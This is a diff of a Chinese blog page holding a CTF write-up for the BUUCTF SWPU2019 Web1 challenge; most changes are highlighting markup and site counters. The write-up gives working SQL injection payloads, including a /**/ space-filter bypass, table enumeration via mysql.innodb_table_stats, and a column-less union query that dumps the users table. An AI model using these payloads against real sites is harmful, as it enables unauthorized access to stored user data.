@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="SWPU2019 Web1打开是个登录界面，先注册登录进去 发现可以申请广告位，在广告位 12输入&amp;apos; 得到回显，证明有SQL注入 试一下 11&amp;apos;union select 1,2,3 发现空格被过滤了 用&#x2F;**&#x2F;代替一下 11&amp;apos;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3 最后用二分法试出有22个字段 11&amp;apos;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3">
+<meta name="description" content="SWPU2019 Web1打开是个登录界面，先注册登录进去 发现可以申请广告位，在广告位 12输入&amp;apos; 得到回显，证明有SQL注入 试一下 11&amp;apos;union select 1,2,3 发现空格被过滤了 用&#x2F;**&#x2F;代替一下 11&amp;apos;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3 最后用二分法试出有22个字段 11&amp;apos;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,1">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF-SWPU2019 Web1">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;17&#x2F;BUUCTF-SWPU2019-Web1&#x2F;index.html">
 <meta property="og:site_name" content="diao-diao-UPUP">
-<meta property="og:description" content="SWPU2019 Web1打开是个登录界面，先注册登录进去 发现可以申请广告位，在广告位 12输入&amp;apos; 得到回显，证明有SQL注入 试一下 11&amp;apos;union select 1,2,3 发现空格被过滤了 用&#x2F;**&#x2F;代替一下 11&amp;apos;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3 最后用二分法试出有22个字段 11&amp;apos;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3">
+<meta property="og:description" content="SWPU2019 Web1打开是个登录界面，先注册登录进去 发现可以申请广告位，在广告位 12输入&amp;apos; 得到回显，证明有SQL注入 试一下 11&amp;apos;union select 1,2,3 发现空格被过滤了 用&#x2F;**&#x2F;代替一下 11&amp;apos;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3 最后用二分法试出有22个字段 11&amp;apos;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,1">
 <meta property="og:locale" content="en">
 <meta property="og:updated_time" content="2020-02-21T06:29:27.784Z">
 <meta name="twitter:card" content="summary">
@@ -387,23 +387,23 @@
       
         <h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="SWPU2019 Web1"></a>SWPU2019 Web1</h1><p>打开是个登录界面，先注册登录进去</p>
 <p>发现可以申请广告位，在广告位</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">'</span><br></pre></td></tr></table></figure>
 <p>得到回显，证明有SQL注入</p>
 <p>试一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;union select 1,2,3</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
 <p>发现空格被过滤了 用/**/代替一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
 <p>最后用二分法试出有22个字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>
 
 <p>这里information_schema被过滤了 所以考虑使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats用于报表名</span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats用于报表名</span><br><span class="line"><span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>
 
 <p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>mysql.innodb_table_stats),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>
 <p>得到表名</p>
 <p>这里还需要用到无列名注入，之前出现过不再多介绍</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>select*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>
 
 <p>得到flag</p>
 
@@ -529,7 +529,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -540,7 +540,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
